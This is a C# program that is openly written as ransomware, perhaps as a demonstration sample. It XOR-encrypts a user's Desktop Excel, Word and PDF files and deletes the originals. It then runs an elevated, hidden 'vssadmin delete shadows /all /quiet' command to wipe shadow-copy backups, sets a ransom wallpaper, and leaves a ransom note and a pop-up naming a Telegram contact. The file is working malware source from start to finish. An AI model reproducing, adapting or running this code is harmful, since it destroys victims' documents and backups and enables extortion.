using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Drawing;
namespace DoIt
{
    internal static class Program
    {
        // PInvoke for changing system parameters ? Used for changing wallpaper later on.
        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 1;
        public const int SPIF_SENDCHANGE = 2;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [STAThread]
        static void Main()
        {
            try
            {
                // Searching in current user's Desktop, only for files with specific extensions (.xlsx, .pdf & .docx)
                string file_searchingPath = Environment.GetEnvironmentVariable("UserProfile") + @"\Desktop";

                // Storing the full paths of all the files with a particular extension in their respective string arrays
                string[] excelFiles = System.IO.Directory.GetFiles(file_searchingPath, "*.xlsx");
                string[] wordFiles = System.IO.Directory.GetFiles(file_searchingPath, "*.docx");
                string[] pdfFiles = System.IO.Directory.GetFiles(file_searchingPath, "*.pdf");

                // Reading the content of the file, byte-by-byte, XOR-ing with a particular value, 
                // writing the content to a new file while deleting the old one.
                // Logic Reference: https://gist.github.com/nakov/1d39c4513cff83b8a735d7dc883dfe18
                for (int i = 0; i < excelFiles.Length; i++)
                {
                    string new_filePath = excelFiles[i] + ".encrypted";
                    string old_filePath = excelFiles[i];

                    using (var oldFile = new FileStream(old_filePath, FileMode.Open, FileAccess.Read))
                    using (var newFile = new FileStream(new_filePath, FileMode.CreateNew, FileAccess.Write))
                    {
                        byte[] temp_buffer = new byte[4096];

                        while (true)
                        {
                            int bytesRead = oldFile.Read(temp_buffer, 0, 4096);

                            if (bytesRead == 0)
                            {
                                break;
                            }

                            else
                            {
                                for (int j = 0; j < bytesRead; j++)
                                {
                                    temp_buffer[j] = (byte)(temp_buffer[j] ^ 68);
                                }

                                newFile.Write(temp_buffer, 0, bytesRead);
                            }
                        }

                        oldFile.Close();
                        newFile.Close();
                        File.Delete(old_filePath);
                    }
                }

                for (int i = 0; i < wordFiles.Length; i++)
                {
                    string new_filePath = wordFiles[i] + ".encrypted";
                    string old_filePath = wordFiles[i];

                    using (var oldFile = new FileStream(old_filePath, FileMode.Open, FileAccess.Read))
                    using (var newFile = new FileStream(new_filePath, FileMode.CreateNew, FileAccess.Write))
                    {
                        byte[] temp_buffer = new byte[4096];

                        while (true)
                        {
                            int bytesRead = oldFile.Read(temp_buffer, 0, 4096);

                            if (bytesRead == 0)
                            {
                                break;
                            }

                            else
                            {
                                for (int j = 0; j < bytesRead; j++)
                                {
                                    temp_buffer[j] = (byte)(temp_buffer[j] ^ 69);
                                }

                                newFile.Write(temp_buffer, 0, bytesRead);
                            }
                        }

                        oldFile.Close();
                        newFile.Close();
                        File.Delete(old_filePath);
                    }
                }

                for (int i = 0; i < pdfFiles.Length; i++)
                {
                    string new_filePath = pdfFiles[i] + ".encrypted";
                    string old_filePath = pdfFiles[i];

                    using (var oldFile = new FileStream(old_filePath, FileMode.Open, FileAccess.Read))
                    using (var newFile = new FileStream(new_filePath, FileMode.CreateNew, FileAccess.Write))
                    {
                        byte[] temp_buffer = new byte[4096];

                        while (true)
                        {
                            int bytesRead = oldFile.Read(temp_buffer, 0, 4096);

                            if (bytesRead == 0)
                            {
                                break;
                            }

                            else
                            {
                                for (int j = 0; j < bytesRead; j++)
                                {
                                    temp_buffer[j] = (byte)(temp_buffer[j] ^ 70);
                                }

                                newFile.Write(temp_buffer, 0, bytesRead);
                            }
                        }

                        oldFile.Close();
                        newFile.Close();
                        File.Delete(old_filePath);
                    }
                }


                // Elevate the Command Prompt and execute 'vssadmin' to delete all shadow volumes
                // Reference #1: https://stackoverflow.com/questions/1469764/run-command-prompt-commands
                // Reference #2: https://stackoverflow.com/questions/133379/elevating-process-privilege-programmatically
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.UseShellExecute = true;
                startInfo.Verb = "runas";
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C vssadmin delete shadows /all /quiet";
                process.StartInfo = startInfo;
                process.Start();

                // Generate random number, and let the program slow down a bit.
                Random rnd = new Random();
                Thread.Sleep(rnd.Next(1, 7) * 1000);

                // Backing up the original wallpaper: Initializing full path
                string originalWallpaper_path = Environment.GetEnvironmentVariable("AppData") + @"\Microsoft\Windows\Themes\TranscodedWallpaper.jpg";
                string originalWallpaper_backupPath = Environment.GetEnvironmentVariable("Temp") + @"\TranscodedWallpaper.jpg.backup";
                
                // If the backed up wallpaper already exists, delete it and create a fresh one.
                if (File.Exists(originalWallpaper_backupPath))
                {
                    File.Delete(originalWallpaper_backupPath);
                }

                // For Windows 10
                else if (!File.Exists(originalWallpaper_backupPath))
                {
                    originalWallpaper_path = Environment.GetEnvironmentVariable("AppData") + @"\Microsoft\Windows\Themes\TranscodedWallpaper";
                    originalWallpaper_backupPath = Environment.GetEnvironmentVariable("Temp") + @"\TranscodedWallpaper.backup";
                }
                 
                // Creating a copy of the original wallpaper
                File.Copy(originalWallpaper_path, originalWallpaper_backupPath);

                // Reference: https://github.com/philhansen/WallpaperChanger
                // Saving the ransomware wallpaper from executable resource to disk, in BMP format
                Image ransomWallpaper = DoIt.Properties.Resources.RansomwareWallpaper;
                string ransomWallpaper_tempPath = Environment.GetEnvironmentVariable("Temp") + @"\RansomwareWallpaper.bmp";
                ransomWallpaper.Save(ransomWallpaper_tempPath, System.Drawing.Imaging.ImageFormat.Bmp);

                // Using PInvoke, changing system parameters to set wallpaper
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, ransomWallpaper_tempPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

                // Deleting the wallpaper from disk, when done
                File.Delete(ransomWallpaper_tempPath);

                // Program slows down again
                Thread.Sleep(rnd.Next(1, 7) * 1000);

                // Path for creating the ransom note
                string ransomNotePath = Environment.GetEnvironmentVariable("UserProfile") + @"\Desktop\contact_info.txt";


                // If a file with the same name exists (hopefully, it shouldn't), delete it and create a fresh one.
                if (File.Exists(ransomNotePath))
                {
                    File.Delete(ransomNotePath);
                }

                // Create the file
                using (FileStream fs = File.Create(ransomNotePath))
                {
                    // Write the message in the ransom note
                    Byte[] fileContent = new UTF8Encoding(true).GetBytes("You've been RANSOMED!\n\nContact @hackersupport2024 on Telegram.\nRef ID: 019CED289ABAA3");
                    fs.Write(fileContent, 0, fileContent.Length);
                }

                // Program slows down again
                Thread.Sleep(rnd.Next(1, 7) * 1000);

                // Final message box pop-up
                string message = "You've been RANSOMED!\n\nContact @hackersupport2024 on Telegram.\nRef ID: 019CED289ABAA3";
                string title = "Warning!";
                MessageBox.Show(message, title, 0, MessageBoxIcon.Warning);
            }

            catch (Exception Ex)
            {
                // Prints the exception message in the Windows message box.
                // Might be invoked if the file path to save ransom note, is not accessible or doesn't not exist. 
                MessageBox.Show(Ex.ToString(), "Exception Warning!", 0, MessageBoxIcon.Warning);
                System.Environment.Exit(1);
            }
        }
    }
}
